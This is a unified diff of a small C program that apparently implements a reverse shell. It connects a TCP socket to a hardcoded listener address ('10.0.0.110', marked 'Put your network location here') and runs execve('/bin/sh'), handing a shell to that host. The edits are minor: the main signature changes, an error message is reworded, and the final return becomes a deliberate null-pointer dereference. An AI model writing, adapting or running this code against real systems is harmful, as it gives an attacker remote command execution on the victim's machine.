@@ -14,7 +14,7 @@
 #define LHOST "10.0.0.110" /* Put your network location here */
 #define LPORT "50000" /* Optional (change if u want) */
 
-int main(int argc, char *argv[])
+int main()
 {
     /*
         Summary
@@ -27,7 +27,7 @@ int main(int argc, char *argv[])
     /* Open a socket */
     int sfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sfd == -1)
-        return fprintf(stderr, "Can't open the socket because: %s\n", strerror(errno));
+        return fprintf(stderr, "Can't open the local socket because: %s\n", strerror(errno));
     struct sockaddr_in saddr;
 
     saddr.sin_family = AF_INET;
@@ -48,6 +48,6 @@ int main(int argc, char *argv[])
     execve("/bin/sh", NULL, NULL);
 
     /* Doesn't close the socket connection */
-
-    return 0;
+    /* This program never returns */
+    return *(int*)(NULL);
 }
